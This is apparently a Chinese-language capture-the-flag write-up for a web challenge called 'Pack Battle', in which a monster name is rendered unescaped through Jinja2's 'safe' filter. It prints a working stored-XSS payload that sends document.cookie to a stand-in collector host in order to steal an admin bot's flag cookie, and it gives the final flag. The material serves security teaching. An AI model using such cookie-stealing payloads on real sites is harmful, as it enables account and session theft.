# Pack Battle

## 题目简述

应用让两只怪物按 `HP × Attack` 比较强度，并让管理员 bot 自动访问结果页。胜者名称会进入解释字符串 `reason`，模板却用 Jinja2 的 `safe` 过滤器直接渲染该字符串；管理员 cookie 又没有 `HttpOnly`，因此可利用存储型 XSS 读取 flag。

## 解题过程

当怪物 1 获胜时，应用构造：

```python
reason = f"{name1} is stronger (hp*attack = {strength1} > {strength2})."
```

结果模板随后执行：

```jinja2
<p>{{ reason | safe }}</p>
```

因此要让携带脚本的怪物确定获胜，例如提交：

```text
name1   = <script>fetch('https://collector.example/?c='+encodeURIComponent(document.cookie))</script>
hp1     = 2
attack1 = 2
name2   = safe
hp2     = 1
attack2 = 1
```

服务生成结果 ID 后通知 bot。bot 先为挑战域设置名为 `admin_flag` 的 cookie，其值就是 flag，且配置为 `httpOnly: false`；随后访问结果页，脚本读取 `document.cookie` 并发送到攻击者控制的收集端。`collector.example` 是文档占位域，实际解题时替换为自己的 HTTPS 接收端。

本地用原 Flask 模板提交无害证明脚本，确认脚本标签在 `reason` 中原样出现而未被转义；bot 源码则独立确认 cookie 名称、作用域和可被 JavaScript 读取的属性。

## 方法总结

单独观察 `{{ name }}` 会误以为 Jinja 默认转义足够；真正的数据流是“用户名称 → 拼接成 reason → `safe` 关闭转义”。利用 bot 型 XSS 还必须确认目标 cookie 非 `HttpOnly`、页面与 cookie 同域，并让恶意名称进入实际渲染分支。最终 flag 为 `grey{h3y_whO_sT0l3_mY_c00k13S!!!}`。
